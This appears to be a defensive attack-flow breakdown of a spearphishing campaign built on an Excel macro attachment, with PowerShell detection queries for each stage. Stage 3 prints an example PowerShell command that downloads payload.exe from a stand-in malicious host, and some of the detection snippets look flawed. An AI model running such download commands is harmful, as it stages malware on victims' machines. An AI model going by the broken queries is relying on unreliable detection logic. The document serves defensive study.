Pattern Name: T1566.001 (Spearphishing Attachment)
Scenario Overview: This attack scenario illustrates a multi-stage spearphishing attack where an attacker sends a malicious email with an attachment that exploits a vulnerability in Microsoft Excel. The attack progresses from the initial email interaction to the execution of a payload that establishes a foothold in the victim's environment.

Attack Flow Breakdown:

**Stage 1: Initial Access via Spearphishing Email**
- **Applications Involved**: Outlook
- **User Action**: The user receives an email with a subject line "Important Document" and an attachment named "Invoice_2023.xlsx".
- **Key Artifacts**: Email headers, attachment file (Invoice_2023.xlsx).
- **Detection Indicators**: Monitor for emails with suspicious attachments, especially those with common file names like "Invoice" or "Report".

**Stage 2: Opening the Malicious Attachment**
- **Applications Involved**: Outlook (parent), Excel (child)
- **User Action**: The user opens the attachment in Excel.
- **Key Artifacts**: Excel file (Invoice_2023.xlsx) containing embedded macros.
- **Detection Indicators**: Look for Excel files that contain macros and are opened from email attachments. Monitor for the execution of macros in Excel.

```shell
# Monitor for the execution of macros in Excel
Get-WinEvent -LogName "Microsoft-Windows-Office/Excel" | Where-Object { $_.Message -like "*macro*" }
```

**Stage 3: Macro Execution and Payload Download**
- **Applications Involved**: Excel (parent), PowerShell (child)
- **User Action**: The macro executes, which runs a PowerShell command to download a malicious payload from a remote server.
- **Key Artifacts**: PowerShell command executed, URL of the malicious payload (e.g., http://malicious-server.com/payload.exe).
- **Detection Indicators**: Monitor for PowerShell commands executed from Excel, especially those that download files from the internet.

```shell
# Example of a PowerShell command that may be executed by the macro
powershell -Command "Invoke-WebRequest -Uri 'http://malicious-server.com/payload.exe' -OutFile 'C:\Users\Victim\AppData\Local\Temp\payload.exe'"
```

**Stage 4: Execution of the Malicious Payload**
- **Applications Involved**: PowerShell (parent), payload executable (child)
- **User Action**: The downloaded payload is executed, establishing a reverse shell to the attacker's command and control server.
- **Key Artifacts**: Executable file (payload.exe), network connections to the C2 server.
- **Detection Indicators**: Monitor for unusual outbound connections from the victim's machine, especially to known malicious IP addresses.

```shell
# Monitor for outbound connections to known malicious IPs
Get-NetTCPConnection | Where-Object { $_.RemoteAddress -eq "malicious-ip-address" }
```

**Stage 5: Establishing Persistence**
- **Applications Involved**: payload executable
- **User Action**: The payload modifies registry keys to ensure persistence on system reboot.
- **Key Artifacts**: Registry keys modified (e.g., HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run).
- **Detection Indicators**: Monitor for changes to registry keys that are commonly used for persistence.

```shell
# Monitor for changes to the registry for persistence
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" | Where-Object { $_.Value -like "*payload.exe*" }
```

**Stage 6: Data Exfiltration**
- **Applications Involved**: payload executable
- **User Action**: The payload collects sensitive data and sends it back to the attacker's C2 server.
- **Key Artifacts**: Network traffic patterns indicating data being sent to the C2 server.
- **Detection Indicators**: Monitor for large outbound data transfers or unusual traffic patterns.

```shell
# Monitor for large outbound data transfers
Get-NetTCPConnection | Where-Object { $_.State -eq "Established" -and $_.LocalPort -eq 80 -or $_.LocalPort -eq 443 }
```
